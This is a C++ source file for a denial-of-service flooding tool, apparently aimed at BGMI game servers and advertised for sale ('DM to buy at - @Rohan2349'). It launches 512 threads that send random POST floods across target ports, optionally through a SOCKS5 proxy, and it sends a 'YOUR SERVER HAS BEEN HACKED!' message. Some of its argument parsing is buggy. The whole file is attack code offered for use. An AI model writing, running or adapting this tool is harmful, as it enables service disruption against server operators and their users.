#include <iostream>
#include <iomanip>
#include <thread>
#include <vector>
#include <mutex>
#include <chrono>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string>
#include <cstring>
#include <fcntl.h>
#include <atomic>
#include <random>
#include <curl/curl.h> // For proxy support

#define MAX_PACKET_SIZE 65507
#define MIN_PACKET_SIZE 1
#define DEFAULT_NUM_THREADS 512

std::atomic<long long> totalPacketsSent(0);
long long totalSendFailures = 0;
double totalDataMB = 0.0;
std::mutex statsMutex;
bool keepSending = true;
bool keepReceiving = true;

std::string proxy_host;
int proxy_port = 0;
std::string proxy_username;
std::string proxy_password;

size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

void countdown(int duration) {
    auto start = std::chrono::steady_clock::now();
    for (int i = duration; i > 0 && keepSending; --i) {
        std::cout << "\rTime Left: " << i << " seconds" << std::flush;
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start).count();
        if (elapsed > 0 && elapsed % 60 == 0) {
            double rate = totalPacketsSent / elapsed;
            std::cerr << "\nRate at " << elapsed << "s: " << rate << " packets/s" << std::flush;
        }
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
    std::cout << "\rTime Left: 0 seconds" << std::endl;
}

void packetSender(int threadId, const std::string& targetIp, int baseTargetPort, int durationSeconds, int packetSize, int numThreads) {
    CURL* curl;
    CURLcode res;
    std::string readBuffer;
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(500, 1500); // Random delay

    curl = curl_easy_init();
    if (!curl) {
        std::cerr << "Thread " << threadId << ": Failed to initialize cURL\n";
        return;
    }

    // Configure proxy if provided
    if (!proxy_host.empty() && proxy_port != 0) {
        curl_easy_setopt(curl, CURLOPT_PROXY, proxy_host.c_str());
        curl_easy_setopt(curl, CURLOPT_PROXYPORT, proxy_port);
        curl_easy_setopt(curl, CURLOPT_PROXYUSERNAME, proxy_username.c_str());
        curl_easy_setopt(curl, CURLOPT_PROXYPASSWORD, proxy_password.c_str());
        curl_easy_setopt(curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); // Assuming SOCKS5
    }
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);

    // Prepare packet
    std::string packetData;
    std::string fakeHeader = "BGMI" + std::to_string(gen() % 9999) + "|" + std::to_string(threadId % 100) + ":";
    int headerLen = std::min((int)fakeHeader.length(), packetSize);
    packetData.append(fakeHeader.substr(0, headerLen));
    for (int i = headerLen; i < packetSize - 1; i++) {
        packetData += (char)(gen() % 256);
    }
    packetData += '\0';

    std::string url = "http://" + targetIp + ":" + std::to_string(baseTargetPort);
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, packetData.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, packetSize);

    long long threadPackets = 0;
    long long threadFailures = 0;
    double threadDataMB = 0.0;
    auto startTime = std::chrono::steady_clock::now();

    while (keepSending) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - startTime).count();
        if (elapsed >= durationSeconds) break;

        int targetPort = baseTargetPort + (gen() % 100);
        url = "http://" + targetIp + ":" + std::to_string(targetPort);
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());

        auto sendStart = std::chrono::high_resolution_clock::now();
        res = curl_easy_perform(curl);
        if (res == CURLE_OK) {
            threadPackets++;
            threadDataMB += static_cast<double>(packetSize) / (1024.0 * 1024.0);
            totalPacketsSent++;
        } else {
            threadFailures++;
            std::cerr << "Thread " << threadId << ": Send failed at " << elapsed << "s, error: " << curl_easy_strerror(res) << "\n";
            std::this_thread::sleep_for(std::chrono::milliseconds(dis(gen)));
            continue;
        }
        auto sendEnd = std::chrono::high_resolution_clock::now();
        auto sendDuration = std::chrono::duration_cast<std::chrono::milliseconds>(sendEnd - sendStart).count();
        long long randomDelay = dis(gen);
        if (randomDelay > sendDuration) {
            std::this_thread::sleep_for(std::chrono::milliseconds(randomDelay - sendDuration));
        }
    }

    {
        std::lock_guard<std::mutex> lock(statsMutex);
        totalSendFailures += threadFailures;
        totalDataMB += threadDataMB;
    }

    curl_easy_cleanup(curl);
}

void packetReceiver(int listenPort, int packetSize) {
    int udpSocket;
    struct sockaddr_in serverAddr, clientAddr;
    char* buffer = new char[packetSize];
    socklen_t clientLen = sizeof(clientAddr);

    udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udpSocket < 0) {
        delete[] buffer;
        return;
    }

    int flags = fcntl(udpSocket, F_GETFL, 0);
    fcntl(udpSocket, F_SETFL, flags | O_NONBLOCK);

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(listenPort);

    if (bind(udpSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        close(udpSocket);
        delete[] buffer;
        return;
    }

    std::string hackMessage = "YOUR SERVER HAS BEEN HACKED! TYPE 'OKAY' OR 'NO' TO RESPOND.";
    sendto(udpSocket, hackMessage.c_str(), hackMessage.length(), 0, (struct sockaddr*)&clientAddr, clientLen);

    while (keepReceiving) {
        ssize_t bytes = recvfrom(udpSocket, buffer, packetSize, 0,
                               (struct sockaddr*)&clientAddr, &clientLen);
        if (bytes > 0) {
            std::string response(buffer, bytes);
            if (response == "OKAY" || response == "NO") {
                break;
            }
        } else if (bytes < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
            break;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }

    close(udpSocket);
    delete[] buffer;
}

int main(int argc, char* argv[]) {
    std::cout << "=======================================\n";
    std::cout << "  Welcome to Rohan Server\n";
    std::cout << "  This is fully working script\n";
    std::cout << "  DM to buy at - @Rohan2349\n";
    std::cout << "=======================================\n\n";

    if (argc < 5 || argc > 7) {
        std::cerr << "Usage: " << argv[0] << " <ip> <port> <time> <packet_size> [--proxy <host:port> --proxy-user <user:pass>]\n";
        return 1;
    }

    std::string targetIp = argv[1];
    int targetPort = std::stoi(argv[2]);
    int durationSeconds = std::stoi(argv[3]);
    int packetSize = std::stoi(argv[4]);

    if (packetSize > MAX_PACKET_SIZE || packetSize < MIN_PACKET_SIZE) {
        std::cerr << "Packet size must be between " << MIN_PACKET_SIZE << " and " << MAX_PACKET_SIZE << "\n";
        return 1;
    }

    // Parse proxy arguments
    if (argc == 7) {
        if (std::string(argv[5]) == "--proxy" && std::string(argv[6]) == "--proxy-user") {
            std::cerr << "Both --proxy and --proxy-user must be provided\n";
            return 1;
        } else if (std::string(argv[5]) == "--proxy") {
            std::string proxy_str = argv[6];
            size_t colon_pos = proxy_str.find(':');
            if (colon_pos == std::string::npos) {
                std::cerr << "Invalid proxy format. Use <host:port>\n";
                return 1;
            }
            proxy_host = proxy_str.substr(0, colon_pos);
            proxy_port = std::stoi(proxy_str.substr(colon_pos + 1));
        } else if (std::string(argv[6]) == "--proxy-user") {
            std::string proxy_user_str = argv[7];
            size_t colon_pos = proxy_user_str.find(':');
            if (colon_pos == std::string::npos) {
                std::cerr << "Invalid proxy-user format. Use <username:password>\n";
                return 1;
            }
            proxy_username = proxy_user_str.substr(0, colon_pos);
            proxy_password = proxy_user_str.substr(colon_pos + 1);
        }
    }

    std::cout << "Starting receiver thread...\n";
    std::thread receiverThread(packetReceiver, targetPort, packetSize);

    std::vector<std::thread> senderThreads;
    for (int i = 0; i < DEFAULT_NUM_THREADS; ++i) {
        senderThreads.emplace_back(packetSender, i, targetIp, targetPort, durationSeconds, packetSize, DEFAULT_NUM_THREADS);
    }

    std::cout << "\nAttack started!\n";
    auto start = std::chrono::steady_clock::now();
    std::thread countdownThread(countdown, durationSeconds);
    countdownThread.join();

    auto end = std::chrono::steady_clock::now();
    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(end - start).count();

    keepSending = false;
    for (auto& t : senderThreads) {
        if (t.joinable()) {
            t.join();
        }
    }

    keepReceiving = false;
    if (receiverThread.joinable()) {
        receiverThread.join();
    }

    std::cout << "Waiting for network to stabilize...\n";
    std::this_thread::sleep_for(std::chrono::seconds(5));

    std::cout << "\nATTACK COMPLETE\n";
    std::cout << "Total Packets Sent: " << totalPacketsSent << " packets\n";
    std::cout << "Total Send Failures: " << totalSendFailures << "\n";
    std::cout << "Total Data: " << std::fixed << std::setprecision(2) << totalDataMB << " MB\n";
    double totalRate = totalPacketsSent / (elapsed > 0 ? elapsed : 1);
    std::cout << "Average Rate: " << totalRate << " packets/s\n";
    std::cout << "DM to buy at - @Rohan2349\n";

    return 0;
}